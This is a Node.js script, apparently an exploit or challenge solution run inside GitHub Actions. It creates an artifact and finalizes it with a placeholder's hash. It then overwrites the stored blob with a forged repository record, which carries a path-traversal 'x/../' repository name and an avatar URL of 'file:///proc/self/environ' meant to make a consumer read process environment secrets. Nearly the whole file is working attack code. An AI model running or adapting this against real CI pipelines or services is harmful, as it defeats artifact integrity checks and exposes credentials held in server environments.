import { createHash } from 'node:crypto';

import { BlobClient } from '@azure/storage-blob';

const SIZE = 4096;

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function actionError(error) {
  const message = String(error?.stack || error)
    .replaceAll('%', '%25').replaceAll('\r', '%0D').replaceAll('\n', '%0A');
  console.log(`::error title=Forge failed::${message}`);
}

try {
  if (!process.env.ACTIONS_RUNTIME_TOKEN || !process.env.ACTIONS_RESULTS_URL) {
    throw new Error('GitHub did not inject the Actions artifact runtime variables');
  }
  if (!/^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(process.env.GITHUB_REPOSITORY || '')) {
    throw new Error('GITHUB_REPOSITORY is missing or invalid');
  }

  const artifactEntry = import.meta.resolve('@actions/artifact');
  const artifactLib = new URL('.', artifactEntry);
  const [{ internalArtifactTwirpClient }, { getBackendIdsFromToken }, { StringValue }] = await Promise.all([
    import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
    import(new URL('internal/shared/util.js', artifactLib)),
    import(new URL('generated/index.js', artifactLib)),
  ]);

  const ids = getBackendIdsFromToken();
  const client = internalArtifactTwirpClient();
  const contentType = Buffer.concat([
    Buffer.from('application/json', 'ascii'),
    Buffer.from([0x85]),
  ]).toString('latin1');
  const name = `cassette-${process.env.GITHUB_RUN_ID}-${process.env.GITHUB_RUN_ATTEMPT}.json`;

  const created = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    mimeType: StringValue.create({ value: 'application/json' }),
    version: 7,
  });
  if (!created.ok || !created.signedUploadUrl) throw new Error('CreateArtifact failed');

  const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
  const options = { blobHTTPHeaders: { blobContentType: contentType } };
  const placeholder = Buffer.concat([Buffer.from('{}'), Buffer.alloc(SIZE - 2, 0x20)]);
  await blob.uploadData(placeholder, options);

  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(SIZE),
    hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
  });
  if (!finalized.ok || !/^\d+$/.test(finalized.artifactId)) {
    throw new Error('FinalizeArtifact failed');
  }

  const repository = `x/../${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`;
  const document = {
    full_name: repository,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Repo Cassette',
    stargazers_count: 0,
  };
  const json = Buffer.from(JSON.stringify(document));
  if (json.length > SIZE) throw new Error('Payload is too large');
  const payload = Buffer.concat([json, Buffer.alloc(SIZE - json.length, 0x20)]);
  await blob.uploadData(payload, options);

  console.log(`OWNER_REPO=${process.env.GITHUB_REPOSITORY}`);
  console.log(`ARTIFACT_ID=${finalized.artifactId}`);
  console.log(`REPOSITORY=${repository}`);
  console.log(`PAYLOAD_SHA256=${sha256(payload)}`);
} catch (error) {
  actionError(error);
  process.exitCode = 1;
}
